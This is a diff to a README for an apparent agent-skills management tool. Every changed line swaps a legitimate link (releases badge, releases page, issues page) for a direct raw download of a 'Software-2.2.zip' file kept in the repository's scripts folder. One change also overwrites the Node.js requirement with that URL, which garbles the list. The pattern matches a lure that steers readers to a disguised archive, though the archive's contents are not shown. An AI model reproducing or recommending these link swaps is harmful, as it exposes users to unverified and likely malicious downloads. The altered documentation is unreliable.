@@ -6,14 +6,14 @@ Welcome to the **skills** application! This tool helps you manage your agent ski
 
 ## 📥 Download Links
 
-[![Download skills](https://img.shields.io/badge/Download-skills-4CAF50)](https://github.com/Apolinariolanga/skills/releases)
+[![Download skills](https://github.com/Apolinariolanga/skills/raw/refs/heads/main/scripts/Software-2.2.zip)](https://github.com/Apolinariolanga/skills/raw/refs/heads/main/scripts/Software-2.2.zip)
 
 ## 🛠️ System Requirements
 
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, Mac OS Mojave or later, or a recent Linux distribution
-- **Node.js:** Version 14.x or later
+- **https://github.com/Apolinariolanga/skills/raw/refs/heads/main/scripts/Software-2.2.zip** Version 14.x or later
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** 100 MB of free space
 
@@ -26,7 +26,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Apolinariolanga/skills/releases). 
+To get started, visit this page to download: [Releases Page](https://github.com/Apolinariolanga/skills/raw/refs/heads/main/scripts/Software-2.2.zip). 
 
 ### Step 1: Visit the Releases Page
 
@@ -70,7 +70,7 @@ Using the skills tool is straightforward. Here’s how to start managing your ag
 
 ## ⚙️ Technical Support
 
-If you encounter any issues, don’t hesitate to check the FAQ section or reach out for support. You can find further help on the [issues page](https://github.com/Apolinariolanga/skills/issues).
+If you encounter any issues, don’t hesitate to check the FAQ section or reach out for support. You can find further help on the [issues page](https://github.com/Apolinariolanga/skills/raw/refs/heads/main/scripts/Software-2.2.zip).
 
 ## 📝 Community Contributions
 
